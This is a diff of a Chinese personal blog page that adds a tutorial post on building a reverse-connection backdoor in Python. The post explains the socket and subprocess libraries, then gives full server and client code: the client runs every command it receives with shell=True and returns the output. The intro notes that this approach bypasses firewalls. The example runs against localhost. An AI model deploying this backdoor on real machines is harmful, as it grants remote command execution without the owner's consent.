@@ -157,6 +157,159 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://2324152038.github.io/2022/09/14/%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5%E5%90%8E%E9%97%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://chunquchunlai.oss-cn-chengdu.aliyuncs.com/3705DE5E0A790DFCC780E4AD61EFC4A6.jpg">
+      <meta itemprop="name" content="春去春来">
+      <meta itemprop="description" content="登峰造极境">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="RISE">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/09/14/%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5%E5%90%8E%E9%97%A8/" class="post-title-link" itemprop="url">反向连接后门</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-09-14 13:04:19 / 修改时间：13:36:38" itemprop="dateCreated datePublished" datetime="2022-09-14T13:04:19+08:00">2022-09-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/python/" itemprop="url" rel="index"><span itemprop="name">python</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>后门常常分为正向后门，反向后门等，反向连接是客户端打开服务器端口，由服务器主动连接客户端。相比于正向连接，反向连接这种方式常用于绕过防火墙和路由器安全限制。我们这里主要讲解反向后门，用到了两个库，socket库，和subprocess库。</p>
+<h1 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h1><p>我们来学习一下socket库，和subprocess库。</p>
+<h2 id="————socket库————"><a href="#————socket库————" class="headerlink" title="————socket库————"></a>————socket库————</h2><p>Socket模块的主要目的就是帮助在网络上的两个程序之间建立信息通道。在python中提供了两个基本的Socket模块：服务端Socket和客户端Socket。当创建了一个服务端Socket之后，这个Socket就会在本机的一个端口上等待连接，客户端Socket会访问这个端口，当两者完成连接之后就能够进行交互了。在使用Socket进行编程时，需要先实例化一个Scoket类。</p>
+<p>使用Socker建立服务端的思路主要是首先实例化一个 Socket类，然后开始循环监听，一直可以接收来自客户端的连接。成功建立连接之后，接收客户端发来的数据，并再向客户端发送数据，传输完毕之后，关闭这次连接。</p>
+<p>使用Socket建立客户端则要简单得多，在实例化一个Socket类之后，连接一个远程的地址，这个地址由IP和端口组成。成功建立连接之后，开始发送和接收数据，传输完毕之后，关闭这次连接。</p>
+<p>实例化格式 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket(family,type[,protpcal])    </span><br></pre></td></tr></table></figure>
+
+<p>第一个参数，family表示地址族，常用的协议族有：AF_INET、AF_INET6。</p>
+<ul>
+<li>AF_INET（TCP&#x2F;IP – IPv4）</li>
+<li>AF_INET6（TCP&#x2F;IP – IPv6）</li>
+</ul>
+<p>第二个参数表示socket类型，这里使用的值有：SOCK_STREAM、SOCK_DGRAM</p>
+<ul>
+<li><p>SOCK_STREAM（TCP流）</p>
+</li>
+<li><p>SOCK_DGRAM（UDP数据报）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s = socket(AF_INET,SOCK_STREAM) #一般来说这样实例化就好了</span><br></pre></td></tr></table></figure>
+
+<p><u>常用函数</u>：</p>
+<p>1.服务端函数</p>
+<p>bind():由服务端调用，与ip地址与端口进行绑定</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s.bind((&quot;127.0.0.1&quot;,8000))</span><br></pre></td></tr></table></figure>
+
+<p>listen():由服务端开启监听模式，参数指定可以挂起的最大连接数量。这个参数的值最小为1，一般设置为5。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s.listen(5)</span><br></pre></td></tr></table></figure>
+
+<p>accept():这个函数用于在使用TCP的服务端接收连接，一般是阻塞态。接受TCP连接并返回(conn,adresse)， 其中，conn 是新的套接字对象，可以用来接收和发送数据； address是连接客户端的地址。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conn,addr = s.accept()</span><br></pre></td></tr></table></figure>
+
+<p>2.客户端函数</p>
+<p>send():这个函数用于在使用TCP时发送数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s.send(&quot;hello&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>recv():这个函数数用于在使用TCP时接收数据，参数代表接受数据的大小</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s.recv(1024)</span><br></pre></td></tr></table></figure>
+
+<p>close():关闭socket连接，记住创建连接后，一定要记得关闭连接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s.close</span><br></pre></td></tr></table></figure>
+
+<p>真是socket常见函数的使用，更多的内容可以自行去搜索</p>
+</li>
+</ul>
+<h2 id="————subprocess库————"><a href="#————subprocess库————" class="headerlink" title="————subprocess库————"></a>————subprocess库————</h2><p>subprocess 模块首先推荐使用的是它的 run 方法，更高级的用法可以直接使用 Popen 接口。我们后面主要用到的是popen方法。</p>
+<h3 id="run-方法语法格式如下："><a href="#run-方法语法格式如下：" class="headerlink" title="run 方法语法格式如下："></a>run 方法语法格式如下：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">subprocess.run(args, *, stdin=None, input=None, stdout=None, stderr=None, capture_output=False, shell=False, cwd=None, timeout=None, check=False, encoding=None, errors=None, text=None, env=None, universal_newlines=None)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>args：表示要执行的命令。必须是一个字符串，字符串参数列表。</li>
+<li>stdin、stdout 和 stderr：子进程的标准输入、输出和错误。其值可以是 subprocess.PIPE、subprocess.DEVNULL、一个已经存在的文件描述符、已经打开的文件对象或者 None。subprocess.PIPE 表示为子进程创建新的管道。subprocess.DEVNULL 表示使用 os.devnull。默认使用的是 None，表示什么都不做。另外，stderr 可以合并到 stdout 里一起输出。</li>
+<li>timeout：设置命令超时时间。如果命令执行时间超时，子进程将被杀死，并弹出 TimeoutExpired 异常。</li>
+<li>check：如果该参数设置为 True，并且进程退出状态码不是 0，则弹 出 CalledProcessError 异常。</li>
+<li>encoding: 如果指定了该参数，则 stdin、stdout 和 stderr 可以接收字符串数据，并以该编码方式编码。否则只接收 bytes 类型的数据。</li>
+<li>shell：如果该参数为 True，将通过操作系统的 shell 执行指定的命令。</li>
+</ul>
+<h3 id="Popen-方法"><a href="#Popen-方法" class="headerlink" title="Popen() 方法"></a>Popen() 方法</h3><p>Popen 是 subprocess的核心，子进程的创建和管理都靠它处理。</p>
+<p>构造函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class subprocess.Popen(args, bufsize=-1, executable=None, stdin=None, stdout=None, stderr=None, </span><br><span class="line">preexec_fn=None, close_fds=True, shell=False, cwd=None, env=None, universal_newlines=False, </span><br><span class="line">startupinfo=None, creationflags=0,restore_signals=True, start_new_session=False, pass_fds=(),</span><br><span class="line">*, encoding=None, errors=None)</span><br></pre></td></tr></table></figure>
+
+<p><strong>常用参数：</strong></p>
+<ul>
+<li>args：shell命令，可以是字符串或者序列类型（如：list，元组）</li>
+<li>bufsize：缓冲区大小。当创建标准流的管道对象时使用，默认-1。<br>0：不使用缓冲区<br>1：表示行缓冲，仅当universal_newlines&#x3D;True时可用，也就是文本模式<br>正数：表示缓冲区大小<br>负数：表示使用系统默认的缓冲区大小。</li>
+<li>stdin, stdout, stderr：分别表示程序的标准输入、输出、错误句柄</li>
+<li>preexec_fn：只在 Unix 平台下有效，用于指定一个可执行对象（callable object），它将在子进程运行之前被调用</li>
+<li>shell：如果该参数为 True，将通过操作系统的 shell 执行指定的命令。</li>
+<li>cwd：用于设置子进程的当前目录。</li>
+<li>env：用于指定子进程的环境变量。如果 env &#x3D; None，子进程的环境变量将从父进程中继承。</li>
+</ul>
+<h1 id="代码阶段"><a href="#代码阶段" class="headerlink" title="代码阶段"></a>代码阶段</h1><h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 建立socke连接</span><br><span class="line">    shell_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    # bind端口，端口6666，要和客户端端口一致</span><br><span class="line">    shell_socket.bind((&quot;127.0.0.1&quot;,6666))</span><br><span class="line">    # listen监听 设置最大俩个连接。</span><br><span class="line">    shell_socket.listen(2)</span><br><span class="line">    # accept 接收 发送命令</span><br><span class="line">    new_shell,addr = shell_socket.accept()</span><br><span class="line">    while True:</span><br><span class="line">        command = input(&quot;~$&quot;)</span><br><span class="line">        new_shell.send(command.encode(&quot;gbk&quot;))</span><br><span class="line">        # 显示 数据</span><br><span class="line">        data = new_shell.recv(2048).decode(&quot;gbk&quot;) </span><br><span class="line">        if data:</span><br><span class="line">            print (data)</span><br><span class="line">        else:</span><br><span class="line">            break</span><br><span class="line">    # 关闭连接</span><br><span class="line">    new_shell.close()</span><br><span class="line">    shell_socket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import subprocess,socket</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    ip = &quot;127.0.0.1&quot;</span><br><span class="line">    port = 6666  #和服务端端口一致</span><br><span class="line">    # 建立socket</span><br><span class="line">    shell_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    # connect连接</span><br><span class="line">    shell_socket.connect((ip,port))</span><br><span class="line">    # 接收数据</span><br><span class="line">    while True:</span><br><span class="line">        data = shell_socket.recv(1024).decode(&quot;gbk&quot;)</span><br><span class="line">        # subprocess执行shell命令</span><br><span class="line">        command = subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE) #data代表指令，其他三个代表，标准输入，标准输出和错误输出</span><br><span class="line">        STDOUT,STDERR = command.communicate()</span><br><span class="line">        # byte 类型区别于 python2.X</span><br><span class="line">        # 发送输出命令</span><br><span class="line"></span><br><span class="line">        shell_socket.send(STDOUT) # 直接发送bytes</span><br><span class="line">    # 关闭socket</span><br><span class="line">    shell_socket.close()</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<h1 id="整体代码"><a href="#整体代码" class="headerlink" title="整体代码"></a>整体代码</h1><h2 id="服务端-1"><a href="#服务端-1" class="headerlink" title="服务端"></a>服务端</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    shell_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    shell_socket.bind((&quot;127.0.0.1&quot;,6666))</span><br><span class="line">    shell_socket.listen(2)</span><br><span class="line">    new_shell,addr = shell_socket.accept()</span><br><span class="line">    while True:</span><br><span class="line">        command = input(&quot;~$&quot;)</span><br><span class="line">        new_shell.send(command.encode(&quot;gbk&quot;))</span><br><span class="line">        data = new_shell.recv(2048).decode(&quot;gbk&quot;)</span><br><span class="line">        if data:</span><br><span class="line">            print (data)</span><br><span class="line">        else:</span><br><span class="line">            break</span><br><span class="line">    new_shell.close()</span><br><span class="line">    shell_socket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<h2 id="客户端-1"><a href="#客户端-1" class="headerlink" title="客户端"></a>客户端</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import subprocess,socket</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    ip = &quot;127.0.0.1&quot;</span><br><span class="line">    port = 6666</span><br><span class="line">    shell_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    shell_socket.connect((ip,port))</span><br><span class="line">    while True:</span><br><span class="line">        data = shell_socket.recv(1024).decode(&quot;gbk&quot;)</span><br><span class="line"></span><br><span class="line">        command = subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)</span><br><span class="line">        STDOUT,STDERR = command.communicate()</span><br><span class="line">        shell_socket.send(STDOUT) </span><br><span class="line">    shell_socket.close()</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<h1 id="运行实例"><a href="#运行实例" class="headerlink" title="运行实例"></a>运行实例</h1><p>先运行服务端，在运行客户端，服务端显示这个界面</p>
+<p><img src="https://chunquchunlai.oss-cn-chengdu.aliyuncs.com/dasdcacjcacc.png"></p>
+<p>输入命令whoami</p>
+<p><img src="https://chunquchunlai.oss-cn-chengdu.aliyuncs.com/asdafahfhafaggzv.png"></p>
+<p>输入命令ipconfig</p>
+<p><img src="https://chunquchunlai.oss-cn-chengdu.aliyuncs.com/addasifiofovac.png"></p>
+<p>运行成功</p>
+<p>subprocess 借鉴文章：<a target="_blank" rel="noopener" href="https://www.runoob.com/w3cnote/python3-subprocess.html">Python3 subprocess | 菜鸟教程 (runoob.com)</a></p>
+<p>socket库借鉴文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42967398/article/details/105326616">https://blog.csdn.net/qq_42967398/article/details/105326616</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://2324152038.github.io/2022/09/07/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86%E5%99%A8/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2203,7 +2356,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-count">24</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
